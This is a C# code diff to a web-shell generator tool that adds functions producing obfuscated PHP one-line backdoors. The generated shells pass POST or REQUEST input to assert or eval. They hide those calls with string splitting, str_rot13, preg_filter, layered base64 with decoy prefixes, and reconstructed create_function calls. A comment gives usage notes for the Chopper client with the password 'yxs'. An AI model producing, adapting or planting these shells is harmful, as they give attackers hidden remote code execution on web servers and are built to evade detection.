@@ -1,4 +1,5 @@
 ﻿using C2.Controls;
+using C2.Core;
 using C2.Utils;
 using System;
 using System.Text;
@@ -147,7 +148,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string GenOneWord2(string password)
         {
             // <?php $k="ass"."ert"; @$k(${"_PO"."ST"}['yxs']);?>
-            return "<? php $k" + " = \"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
+            return @"<?php $k" + "=\"ass\".\"e" + "rt\"; @$k(${\"_PO\"." + "\"ST\"}" + string.Format("['{0}']);?>", password);
         }
         private string GenOneWord3(string password)
         {
@@ -166,7 +167,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             sb.Append("<?php function xm")
               .Append("($a){$c=str_rot13('nffreg');")
               .Append("$c($a);}xm($_REQUEST")
-              .Append(string.Format("['{0}']); ?>", password));
+              .Append(string.Format("['{0}']);?>", password));
             return sb.ToString();
         }
         private string GenOneWord6(string password)
@@ -175,15 +176,37 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         private string GenOneWord7(string password)
         {
-            throw new NotImplementedException();
+            // <?php $a=preg_filter('/\s+/','','as s er t');@$a($_REQUEST['yxs']);?>
+            return string.Format(@"<?ph" + @"p $a=pre" + @"g_filter('/\s+/','','as" + @" s er t');@$a($_R" + @"EQUES" + @"T['{0}']);?>", password);
         }
         private string GenOneWord8(string password)
         {
-            throw new NotImplementedException();
+            string vvnr1 = "UUdWMllX";
+            string hitq5 = "d29KRjlR";
+            string qajd2 = "VDFOVVd5";
+            string itfh2 = ST.EncodeBase64(ST.EncodeBase64(string.Format("@eval($_POST['{0}']);", password)))
+                             .Substring(vvnr1.Length)
+                             .Substring(hitq5.Length)
+                             .Substring(qajd2.Length);
+
+
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine(@"<?php ")
+              .AppendLine(string.Format("$qajd2=\"{0}\";$vvnr1=\"{1}\";$hitq5=\"{2}\";$itfh2=\"{3}\";", qajd2, vvnr1, hitq5, itfh2))
+              .AppendLine("$akmi4 = str_replace(\"eu2\",\"\",\"eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce\");")
+              .AppendLine("$hygg4 = $akmi4(\"so0\", \"\", \"so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e\");")
+              .AppendLine("$gzsw5 = $akmi4(\"qik6\",\"\",\"qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n\");")
+              .AppendLine("$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4(\"$; *,.\", \"\", $vvnr1.$hitq5.$qajd2.$itfh2))));")
+              .AppendLine("$foxl6();")
+              .AppendLine("?>");
+
+            return sb.ToString();
         }
         private string GenOneWord9(string password)
         {
-            throw new NotImplementedException();
+            // 在菜刀里写 http://site/webshell.php?2=assert 密码是yxs
+            // <?php ($_=@$_GET[2]).@$_($_POST['yxs'])?>
+            return string.Format(@"<?ph" + @"p ($_=@$_GET" + "[2]).@$_($_PO" + @"ST['{0}'])?>", password);
         }
 
     }
